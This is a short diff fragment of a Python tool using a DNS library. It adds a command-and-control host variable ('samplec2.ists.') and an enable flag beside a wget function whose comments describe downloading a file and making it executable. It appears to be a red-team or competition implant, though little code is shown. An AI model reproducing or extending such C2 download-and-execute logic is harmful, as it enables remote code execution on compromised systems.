@@ -28,6 +28,9 @@ import argparse
 import time
 from dns.clib import *
 
+c2IP = "samplec2.ists."
+c2enabled = False
+
 def wget(cmd):
     #parse a "wg http://..." command
     #chmod +x downloaded file
